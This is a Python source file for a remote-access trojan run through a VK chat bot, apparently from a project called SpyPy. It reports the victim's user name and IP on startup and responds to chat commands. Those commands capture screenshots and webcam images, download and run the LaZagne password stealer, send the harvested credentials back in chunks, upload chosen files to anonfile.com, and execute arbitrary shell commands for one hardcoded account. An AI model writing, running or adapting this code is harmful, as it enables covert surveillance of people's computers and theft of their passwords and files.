import vk_api.vk_api
import random
import urllib.request, json 
from bs4 import BeautifulSoup 
import requests
from vk_api.bot_longpoll import VkBotLongPoll
from vk_api.bot_longpoll import VkBotEventType
import requests
import time, os
import string
import datetime
from mss import mss
import getpass
import shutil, os
import socket
import subprocess
import wget 
import cv2
from tok import token #токен
from tok import id_id #id группы
from tok import admin #id админа
from vers import ver

USER_NAME = getpass.getuser()

class Server:

            def __init__(self, api_token, group_id, server_name: str="Empty"):

                # Даем серверу имя
                self.server_name = server_name

                # Для Long Poll
                self.vk = vk_api.VkApi(token=api_token)

                self.upload = vk_api.VkUpload(self.vk)

                # Для использования Long Poll API
                self.long_poll = VkBotLongPoll(self.vk, group_id)

                # Для вызова методов vk_api
                self.vk_api = self.vk.get_api()

            def send_img(self, send_id, attachments, text): #отправляем картинку с текстом
                self.vk_api.messages.send(peer_id=send_id,
                                          message=text,
                                          attachment = attachments,
                                          random_id=123456 + random.randint(1,27))

            def send_msg(self, send_id, message): # отправляем текст
                self.vk_api.messages.send(peer_id=send_id,
                                          message=message,
                                          random_id=123456 + random.randint(1,27))
            def send_doc(self, send_id, doc): # не знаю, зачем она здесь
                self.vk_api.messages.send(peer_id=send_id,
                                          attachment = doc,
                                          random_id=123456 + random.randint(1,27))
            def StartSystem(self):#при запуске компьютера
                print("i am started!")
                ipComputer = self.getIp()
                self.send_msg(admin, USER_NAME + " онлайн. \nip: \n" + ipComputer)
            def getIp(self):
                url = 'http://ip-api.com/json'
                response = requests.get(url)
                html = urllib.request.urlopen(url).read()
                soup = BeautifulSoup(html, "lxml")
                for script in soup(["script", "style"]):
                    script.extract()
                text = soup.get_text()
                lines = (line.strip() for line in text.splitlines())
                chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                text = '\n'.join(chunk for chunk in chunks if chunk)
                a = json.loads(text)
                ipComputer = a["as"] +"\n"+ a["city"] +"\n"+ a["query"]
                return ipComputer

            def start(self):
                self.StartSystem()
                for event in self.long_poll.listen():
                    print(event.object.text, " ", event.object.peer_id, " ", event.object.from_id)
                    if event.object.text == "скрин" or event.object.text == "Скрин":
                        with mss() as sct:
                            sct.shot()
                        pfile = requests.post(self.vk_api.photos.getMessagesUploadServer(peer_id = event.object.peer_id)['upload_url'], files = {'photo': open('monitor-1.png', 'rb')}).json()
                        #print(pfile)
                        photo = self.vk_api.photos.saveMessagesPhoto(server = pfile['server'], photo = pfile['photo'], hash = pfile['hash'])[0]
                        print(photo)
                        print(photo["sizes"][4]["url"])
                        self.send_img(event.object.peer_id, 'photo%s_%s'%(photo['owner_id'], photo['id']), USER_NAME)
                    if event.object.text == "локаль" or event.object.text == "Локаль":
                        self.send_msg(event.object.peer_id, socket.gethostbyname(socket.gethostname()))
                    if event.object.text == "ip" or event.object.text == "Ip":
                        ipComputer = self.getIp()
                        self.send_msg(event.object.peer_id, ipComputer)
                    if event.object.text == "ычан":
                        wget.download("https://raw.githubusercontent.com/LencoDigitexer/SpyPy/master/update/test.py", "update.py")
                        pfile = requests.post(self.vk_api.photos.getMessagesUploadServer(peer_id = event.object.peer_id)['upload_url'], files = {'photo': open('ny.png', 'rb')}).json()
                        #print(pfile)
                        photo = self.vk_api.photos.saveMessagesPhoto(server = pfile['server'], photo = pfile['photo'], hash = pfile['hash'])[0]
                        print(photo)
                        print(photo["sizes"][4]["url"])
                        self.send_img(event.object.peer_id, 'photo%s_%s'%(photo['owner_id'], photo['id']), USER_NAME)
                    if event.object.text == "вебка" or event.object.text == "Вебка":
                        try:
                            cap = cv2.VideoCapture(0)
                            for i in range(30):
                                cap.read()
                            ret, frame = cap.read()
                            cv2.imwrite('cam.png', frame)
                            cap.release()
                            pfile = requests.post(self.vk_api.photos.getMessagesUploadServer(peer_id = event.object.peer_id)['upload_url'], files = {'photo': open('cam.png', 'rb')}).json()
                            #print(pfile)
                            photo = self.vk_api.photos.saveMessagesPhoto(server = pfile['server'], photo = pfile['photo'], hash = pfile['hash'])[0]
                            print(photo)
                            print(photo["sizes"][4]["url"])
                            self.send_img(event.object.peer_id, 'photo%s_%s'%(photo['owner_id'], photo['id']), USER_NAME)
                        except:
                            self.send_msg(event.object.peer_id, "Вебка не работает или не сущесвует")
                    if event.object.text == "версия" or event.object.text == "Версия":
                        url = 'http://ip-api.com/json'
                        response = requests.get(url)
                        html = urllib.request.urlopen(url).read()
                        soup = BeautifulSoup(html, "lxml")
                        for script in soup(["script", "style"]):
                            script.extract()
                        text = soup.get_text()
                        lines = (line.strip() for line in text.splitlines())
                        chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
                        text = '\n'.join(chunk for chunk in chunks if chunk)
                        a = json.loads(text)
                        ip = a["query"]
                        text = "Текущая версия на компьютере " + str(USER_NAME) + " ip:" + str(ip) + " = " + str(ver)
                        self.send_msg(event.object.peer_id, text)
                    if event.object.text == "обнова":
                        url = 'https://raw.githubusercontent.com/LencoDigitexer/SpyPy/master/update/test.py'
                        response = requests.get(url)
                        html = urllib.request.urlopen(url).read()
                        soup = BeautifulSoup(html, "lxml")
                        for script in soup(["script", "style"]):
                            script.extract()
                        vr = soup.get_text()
                        text = "Версия для обновления " + str(vr)
                        self.send_msg(event.object.peer_id, text)
                    if event.object.text == "обновиться":
                        url = 'https://raw.githubusercontent.com/LencoDigitexer/SpyPy/master/update/test.py'
                        response = requests.get(url)
                        html = urllib.request.urlopen(url).read()
                        soup = BeautifulSoup(html, "lxml")
                        for script in soup(["script", "style"]):
                            script.extract()
                        vr = soup.get_text()
                        if int(ver) == int(vr):
                            print(str(ver) + str(vr))
                            text = "Обновление не нужно на компьютере: " + str(USER_NAME)
                            self.send_msg(event.object.peer_id, text)
                        else:
                            print(str(ver) + str(vr))
                            text = "Требуется обновление для компьютера: " + str(USER_NAME)
                            self.send_msg(event.object.peer_id, text)
                    if event.object.text == "взломать пароли":
                        files = os.listdir(os.getcwd()) 
                        password_attacker = False
                        for i in range(len(files)):
                            print(files[i])
                            if files[i] == "run.exe":
                                self.send_msg(event.object.peer_id, "Файл взлома существует")
                                password_attacker = True
                                self.send_msg(event.object.peer_id, "взламываем")
                                os.system("run.exe all -quiet -oJ")
                                print(password_attacker)
                                break
                        if password_attacker == False:
                            self.send_msg(event.object.peer_id, "скачиваем утилиту")
                            wget.download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe", "run.exe")
                            self.send_msg(event.object.peer_id, "взламываем")
                            os.system("run.exe all -quiet -oJ")
                        self.send_msg(event.object.peer_id, "пароли взломаны")
                    if event.object.text == "dir":
                        files = os.listdir(os.getcwd()) 
                        text = ""
                        for i in range(len(files)):
                            text = text + "\n" + files[i]
                        self.send_msg(event.object.peer_id, text)
                    if event.object.text == "скачать пароли":
                        files = os.listdir(os.getcwd()) 
                        for i in range(len(files)):
                            if files[i].startswith("credentials") and files[i].endswith("json"):
                                self.send_msg(event.object.peer_id, files[i])
                                docum = files[i]
                        print(docum)
                        f = open(docum, 'r')
                        #print(len(f.read()))
                        text = f.read().split()
                        send = ""
                        print(len(text))
                        for i in range(len(text)):
                                send = send  + text[i]
                                #print(send)
                                if len(send) > 1000:
                                        self.send_msg(event.object.peer_id, send)
                                        send = ""
                        print(send)
                        self.send_msg(event.object.peer_id, send)

                    else:
                        lst = event.object.text.split()
                        print(lst)
                        print(len(lst))
                        #self.send_msg(event.object.peer_id, lst)
                        if len(lst)==2:
                            if lst[0] == 'скачать' or lst[0] == 'Скачать':
                                text = "скачивается " + str(lst[1])
                                self.send_msg(event.object.peer_id, text)
                                file = lst[1]
                                files = {
                                    'file': (file, open(file, 'rb')),
                                }
                                anonfile = requests.post('https://anonfile.com/api/upload', files=files)
                                anonfile = anonfile.json()
                                text = anonfile['data']["file"]["url"]["full"]
                                self.send_msg(event.object.peer_id, text)



                        if event.object.from_id == 510166866:
                            try:
                                lst = event.object.text.split()
                                command = lst
                                p = subprocess.Popen(command, stdout=subprocess.PIPE)
                                text = p.stdout.read()
                                print(text.decode('utf-8'))
                                text = text.decode('utf-8')
                                self.send_msg(event.object.peer_id, text)
                            except:
                                pass

if __name__ ==  "__main__":
    server1 = Server(token, id_id, "server1")
    server1.start()  
